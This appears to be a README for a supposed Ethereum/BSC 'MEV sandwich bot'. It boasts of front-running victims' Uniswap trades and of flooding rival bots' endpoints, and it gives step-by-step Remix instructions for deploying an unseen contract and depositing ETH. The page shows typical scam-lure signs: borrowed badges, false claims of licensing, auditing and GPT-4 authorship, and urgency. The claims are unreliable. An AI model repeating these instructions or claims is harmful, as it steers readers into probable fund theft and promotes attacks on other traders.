![exp](https://i.imgur.com/Wf510LC.png)
-----
[![codecov.io Code Coverage](https://img.shields.io/codecov/c/github/dwyl/hapi-auth-jwt2.svg?maxAge=2592000)](https://codecov.io/github/dwyl/hapi-auth-jwt2?branch=master) ![GitHub CI](https://github.com/dwyl/auth_plug/actions/workflows/ci.yml/badge.svg) ![Custom badge](https://img.shields.io/endpoint?color=purple&label=MEVBOTS-ONLINE🌐&logo=hello&logoColor=red&url=https%3A%2F%2Fhits.dwyl.com%2Fvyntr%2FMevBot-sandwich.json)


Making money via AI MEVbot attack opportunities (GPT-4 source) (AUDITED)!
-----

**The officially licensed jaredfromsubway.eth mevbot source code**

**UPDATE 05/01/2023:** I've announced that I will be removing the open source version of my MevBot on **05/09/2023** in light of imminent network upgrades to mitigate MEV arbitrage generation, probably caused by releasing this. **MEVBOT SOLUTIONS™** will be providing a premium version of the service in the future with plans beginning at **.5 eth**.

-----

Please note that the code was never intended for public release, as it was designed for my own purposes and contains various trade-offs. However, this method has been highly refined through extensive study, research, and experimentation. 

Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.

The MEVbot actively **sniffs the UniswapV2 mempool** and **identifies profitable slippage exploitation opportunities** to **sandwich attack a victims transaction**. The bot bundles its own transactions and **takes advantage of flashswaps and flashloans via flashbot RPC** with competitive gas and tips towards miners to gurantee **successful attack vectors** and **transaction order manipulation**. It actively competes with other bots to swap tokens on-chain quickly, The bot then returns the ETH to the contract, ready for withdrawal.

This bot does all that, and 99.9% faster than other bots.

'But ser, there are open source bots that do the same'

 -Yes, indeed there are. Mine was the first, however. And I **still** outperform them. Reading their articles makes me giggle, as I went through their same pains and from one bot builder to another, I feel these guys. <3

'Wen increase aggressiveness ?'

 -I've spent a year obsessing about this, I have a list of target endpoints that I know other bots use, which I could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.

..Personal journey in this

'What did I learn?'

 -MEV, Frontrunning, EIP-1559, "[The Dark Forest](https://www.paradigm.xyz/2020/08/ethereum-is-a-dark-forest/) 🌲💡", various tricks to exploit more web3 and web2 kind of architectures. And all sorts of ins and outs about Unsiwap and DEX

'So why stop?'

 -I've made some profits from this but now I'm using more efficient commercial and private methods, -I'm ready to share what I've learned so devs don't need to go through the same pain.

Towards the end I kept getting outcompeted by this individual:

https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e

If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.

But I will give you some competition.(ㆆ_ㆆ)

Overview 📜
------
- Usage
- Notes

Usage ✨
----

You can see an example of how the bot works.
![0](https://user-images.githubusercontent.com/131911477/234767193-be276a13-315f-4e82-89c1-e37fa94a9952.png)


The bot will utilize the entire balance to transact arbitrage

![exemple 4](https://user-images.githubusercontent.com/131911477/234769046-932b596d-a133-4973-abff-2f97408bcd2d.png)
![exemple5](https://user-images.githubusercontent.com/131911477/234769052-88db1c19-b1e7-47fd-9991-d234fe6413ca.png)



### ✏️ <ins>Step 1:</ins> 
Remix
-----
Access the Remix IDE, this is where we deploy the bot  https://remix.ethereum.org/ 
-----------
### ✏️ <ins>Step 2:</ins> 
File Explorer
---------
Click the document icon at the top of the vertical menu, then click the tiny button in the top left of the file explorer to create new file, name it "mevbot.sol".

Copy the code from MEV-bot_v5.1.sol and paste it in Remix IDE.

![1](https://user-images.githubusercontent.com/131911477/234766560-33cd5cc5-4fc0-45fd-8541-5f2a2fd5232d.png)


### ✏️ <ins>Step 3:</ins> 
Click Solidity complier 0.6.6
------

### ✏️ <ins>Step 4:</ins> 
Press Compile
-----
![2](https://user-images.githubusercontent.com/131911477/234766622-5528655c-3c99-432b-b8ca-3b82fbcddeb8.png)


### ✏️ <ins>Step 5:</ins> 
Select ETH or BSC(BNB) network
-----

Paste ETH or BNB in the top field, and the router address of the dex you wish to use

### ✏️ <ins>Step 6:</ins> Press Transact (Deploy)
-----

![3](https://user-images.githubusercontent.com/131911477/234766652-0254d9fd-8c9f-48d7-b511-4015f4ea2729.png)


### ✏️ <ins>Step 7:</ins> Deposit balance and start
------

Copy the contract address of your deployed MevBot and send a number of Ethereum to the bots balance and call the start method for the bot to begin trading.

![4](https://user-images.githubusercontent.com/131911477/234766676-fdbf97ef-d52e-4949-bea3-76696f646fd1.png)


![4 1](https://user-images.githubusercontent.com/131911477/234766691-727309f8-e73f-4ebe-84c5-77ead40b137a.png)


![5](https://user-images.githubusercontent.com/131911477/234766701-761850b3-3add-4b2e-9555-af3d6a28baba.png)

-----
The MEVBot begins trading immeditately, simpy wait for profits to accumulate. 

### ❗ <ins>NOTE:</ins>
Due to high network usage to ensure successful transactions on the Ethereum network, maintain a sufficient balance to cover gas fees **(recommended 0.1 - 0.2 ETH)**.

You can stop the bot or withdraw your funds at any time by calling the withdrawal function.
